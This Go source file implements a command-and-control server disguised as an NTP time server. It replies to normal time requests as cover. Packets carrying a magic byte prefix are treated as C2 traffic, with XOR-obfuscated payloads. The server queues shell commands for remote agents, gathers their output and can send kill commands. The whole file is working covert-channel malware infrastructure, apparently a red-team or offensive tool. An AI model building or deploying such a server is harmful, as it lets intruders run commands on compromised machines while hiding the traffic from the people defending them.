package server

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"goMESA/internal/common"
)

const (
	// NTP specific constants
	ntpEpochOffset = 2208988800 // Seconds between NTP epoch (1900) and Unix epoch (1970)
	ntpPort        = 123
)

// NTPServer represents an NTP server that also serves as C2 server
type NTPServer struct {
	db             *Database
	listener       net.PacketConn
	running        bool
	commandQueue   map[string][]string  // Map of agentID to command queue
	outputQueue    map[string]string    // Map of agentID to accumulated output
	responseWaitCh map[string]chan bool // Channels for waiting on command responses
	commandMutex   sync.Mutex
	outputMutex    sync.Mutex
	responseMutex  sync.Mutex
}

// NewNTPServer creates a new NTP server
func NewNTPServer(db *Database) *NTPServer {
	return &NTPServer{
		db:             db,
		running:        false,
		commandQueue:   make(map[string][]string),
		outputQueue:    make(map[string]string),
		responseWaitCh: make(map[string]chan bool),
	}
}

// Start starts the NTP server
func (s *NTPServer) Start() error {
	var err error
	s.listener, err = net.ListenPacket("udp", fmt.Sprintf(":%d", ntpPort))
	if err != nil {
		return fmt.Errorf("failed to listen on port %d: %v", ntpPort, err)
	}

	s.running = true
	log.Printf("NTP/C2 server listening on port %d", ntpPort)

	// Start a goroutine to check for missing agents
	go s.checkMissingAgents()

	// Start handling incoming packets
	go s.handleIncomingPackets()

	return nil
}

// Stop stops the NTP server
func (s *NTPServer) Stop() error {
	if !s.running {
		return nil
	}

	s.running = false
	return s.listener.Close()
}

// checkMissingAgents periodically checks for agents that have not been seen in a while
func (s *NTPServer) checkMissingAgents() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for s.running {
		select {
		case <-ticker.C:
			err := s.db.SetMissingAgents()
			if err != nil {
				log.Printf("Error checking for missing agents: %v", err)
			}
		}
	}
}

// handleIncomingPackets processes incoming NTP packets
func (s *NTPServer) handleIncomingPackets() {
	buffer := make([]byte, 1024)

	for s.running {
		n, addr, err := s.listener.ReadFrom(buffer)
		if err != nil {
			if !s.running {
				return // Server is shutting down
			}
			log.Printf("Error reading from UDP socket: %v", err)
			continue
		}

		// Process the packet in a separate goroutine
		go s.processPacket(buffer[:n], addr)
	}
}

// systemToNTPTime converts a system time to NTP time
func systemToNTPTime(t time.Time) uint64 {
	seconds := uint64(t.Unix()) + ntpEpochOffset
	fraction := uint64(t.Nanosecond()) * (1 << 32) / 1e9
	return (seconds << 32) | fraction
}

// processPacket handles a received NTP packet
func (s *NTPServer) processPacket(data []byte, addr net.Addr) {

	// Get client IP address
	clientIP := addr.(*net.UDPAddr).IP.String()

	log.Printf("Received packet from %s, length: %d bytes", clientIP, len(data))

	// Debug: Dump the first 16 bytes of each packet
	if len(data) >= 16 {
		log.Printf("Packet header: % x", data[:16])
	}

	// Check if this is a C2 packet (our baseline marker)
	if bytes.HasPrefix(data, []byte{0x1a, 0x01, 0x0a, 0xf0}) {
		log.Printf("C2 packet identified from %s", clientIP)
		// This is a C2 packet, process it
		s.processC2Packet(data, clientIP, addr)
		return
	}

	// Check if this is a valid NTP packet
	if len(data) < 48 {
		// Handle as a standard NTP request
		s.handleStandardNTP(data, addr)
		return
	}

	// Check if this is a C2 packet (our baseline marker)
	if bytes.HasPrefix(data, []byte{0x1a, 0x01, 0x0a, 0xf0}) {
		// This is a C2 packet, process it
		s.processC2Packet(data, clientIP, addr)
		return
	}

	// Otherwise, handle as a standard NTP request
	s.handleStandardNTP(data, addr)
}

// handleStandardNTP responds to a standard NTP request
func (s *NTPServer) handleStandardNTP(data []byte, addr net.Addr) {

	log.Printf("Handling standard NTP request from %s", addr.String())

	// Simple NTP server implementation
	response := make([]byte, 48)

	// Set the first byte: Leap Indicator (0), Version (4), Mode (4, server)
	response[0] = 0x24 // 00 100 100 in binary

	// Set the stratum (1-15, lower is better)
	response[1] = 2

	// Set the poll interval (log2 of poll interval in seconds)
	response[2] = 10 // 2^10 = 1024 seconds

	// Set the precision (log2 of precision in seconds)
	response[3] = 0xEC // -20, about one microsecond

	// Fill in timestamps
	now := time.Now()
	receiveTime := systemToNTPTime(now)
	transmitTime := systemToNTPTime(now.Add(1 * time.Microsecond))

	// Copy origin timestamp from client's transmit timestamp
	if len(data) >= 48 {
		copy(response[24:32], data[40:48])
	}

	// Set receive timestamp (when we received the client's request)
	response[32] = byte(receiveTime >> 56)
	response[33] = byte(receiveTime >> 48)
	response[34] = byte(receiveTime >> 40)
	response[35] = byte(receiveTime >> 32)
	response[36] = byte(receiveTime >> 24)
	response[37] = byte(receiveTime >> 16)
	response[38] = byte(receiveTime >> 8)
	response[39] = byte(receiveTime)

	// Set transmit timestamp (when we sent our response)
	response[40] = byte(transmitTime >> 56)
	response[41] = byte(transmitTime >> 48)
	response[42] = byte(transmitTime >> 40)
	response[43] = byte(transmitTime >> 32)
	response[44] = byte(transmitTime >> 24)
	response[45] = byte(transmitTime >> 16)
	response[46] = byte(transmitTime >> 8)
	response[47] = byte(transmitTime)

	// Send the response
	s.listener.WriteTo(response, addr)
}

// processC2Packet processes a C2 packet received from an agent
func (s *NTPServer) processC2Packet(data []byte, clientIP string, addr net.Addr) {

	if len(data) < 15 {
		return // Not enough data for a valid C2 packet
	}

	// Extract the command type
	commandType := string(data[11:15])

	log.Printf("Processing C2 packet from %s, command type: %s", clientIP, commandType)

	// Extract and decode the payload if present
	var payload string
	if len(data) > 15 {
		// Decrypt the XOR encoded data using '.' as the key
		decrypted := common.XORDecrypt(data[15:], '.')
		// Trim null bytes
		payload = string(bytes.Trim(decrypted, "\x00"))
	}

	// Record agent activity in the database
	err := s.db.AddAgent(clientIP, "")
	if err != nil {
		log.Printf("Error updating agent status: %v", err)
	}

	// Process based on command type
	switch commandType {
	case common.CommandPing:
		// Update agent's last seen time
		err = s.db.UpdateAgentStatus(clientIP, common.AgentStatusAlive)
		if err != nil {
			log.Printf("Error updating agent status: %v", err)
		}
		log.Printf("Received ping from agent %s", clientIP)

		// Send pending commands if any
		s.sendPendingCommands(clientIP)

	case common.CommandContinued, common.CommandOutput:
		// Accumulate command output
		s.outputMutex.Lock()
		if _, exists := s.outputQueue[clientIP]; !exists {
			s.outputQueue[clientIP] = ""
		}
		s.outputQueue[clientIP] += payload

		// If this is the final output packet, process it
		if commandType == common.CommandOutput {
			output := s.outputQueue[clientIP]
			delete(s.outputQueue, clientIP)

			// Send a notification that response is received
			s.responseMutex.Lock()
			if ch, exists := s.responseWaitCh[clientIP]; exists {
				// Get the last command ID from the database for this agent
				commands, err := s.db.GetCommandHistory(clientIP)
				if err == nil && len(commands) > 0 {
					// Update the command output in the database
					s.db.UpdateCommandOutput(commands[0].ID, output)
				}

				// Notify waiting goroutine
				ch <- true
				delete(s.responseWaitCh, clientIP)
			}
			s.responseMutex.Unlock()

			log.Printf("Received command output from agent %s: %s", clientIP, output)
		}
		s.outputMutex.Unlock()
	}
}

// QueueCommand adds a command to the agent's command queue
func (s *NTPServer) QueueCommand(agentID, command string) error {
	s.commandMutex.Lock()
	defer s.commandMutex.Unlock()

	if _, exists := s.commandQueue[agentID]; !exists {
		s.commandQueue[agentID] = []string{}
	}

	// Add to database
	_, err := s.db.AddCommand(agentID, command)
	if err != nil {
		return fmt.Errorf("failed to add command to database: %v", err)
	}

	// Add to queue
	s.commandQueue[agentID] = append(s.commandQueue[agentID], command)
	return nil
}

// SendKillCommand sends a kill command to an agent
func (s *NTPServer) SendKillCommand(agentID string) error {
	packet := common.NewReferencePacket(agentID, common.CommandKill)
	err := packet.SendReferencePacket()
	if err != nil {
		return fmt.Errorf("failed to send kill command: %v", err)
	}

	// Update agent status in database
	err = s.db.UpdateAgentStatus(agentID, common.AgentStatusKilled)
	if err != nil {
		return fmt.Errorf("failed to update agent status: %v", err)
	}

	return nil
}

// SendPingCommand sends a ping command to an agent
func (s *NTPServer) SendPingCommand(agentID string) error {
	packet := common.NewReferencePacket(agentID, common.CommandPing)
	err := packet.SendReferencePacket()
	if err != nil {
		return fmt.Errorf("failed to send ping command: %v", err)
	}
	return nil
}

// ExecuteCommand sends a command to an agent and waits for the response
func (s *NTPServer) ExecuteCommand(agentID, command string) (string, error) {
	// Queue the command
	err := s.QueueCommand(agentID, command)
	if err != nil {
		return "", err
	}

	// Create a channel to wait for response
	s.responseMutex.Lock()
	s.responseWaitCh[agentID] = make(chan bool)
	responseCh := s.responseWaitCh[agentID]
	s.responseMutex.Unlock()

	// Send the command immediately if possible
	if err := s.sendCommandToAgent(agentID, command); err != nil {
		log.Printf("Failed to send command immediately, will try on next ping: %v", err)
	}

	// Wait for response with timeout
	select {
	case <-responseCh:
		// Get command output from database
		commands, err := s.db.GetCommandHistory(agentID)
		if err != nil || len(commands) == 0 {
			return "", fmt.Errorf("failed to get command output: %v", err)
		}
		return commands[0].Output, nil
	case <-time.After(30 * time.Second):
		s.responseMutex.Lock()
		delete(s.responseWaitCh, agentID)
		s.responseMutex.Unlock()
		return "", fmt.Errorf("command timed out")
	}
}

// sendPendingCommands sends any pending commands to the agent
func (s *NTPServer) sendPendingCommands(agentID string) {
	s.commandMutex.Lock()
	defer s.commandMutex.Unlock()

	if commands, exists := s.commandQueue[agentID]; exists && len(commands) > 0 {
		// Get the next command
		command := commands[0]
		s.commandQueue[agentID] = commands[1:]

		// If queue is empty, delete it
		if len(s.commandQueue[agentID]) == 0 {
			delete(s.commandQueue, agentID)
		}

		// Send the command
		go s.sendCommandToAgent(agentID, command)
	}
}

// sendCommandToAgent sends a command to an agent
func (s *NTPServer) sendCommandToAgent(agentID, command string) error {
	packet := common.NewCommandPacket(agentID, command)
	return packet.ChunkAndSendCommand()
}
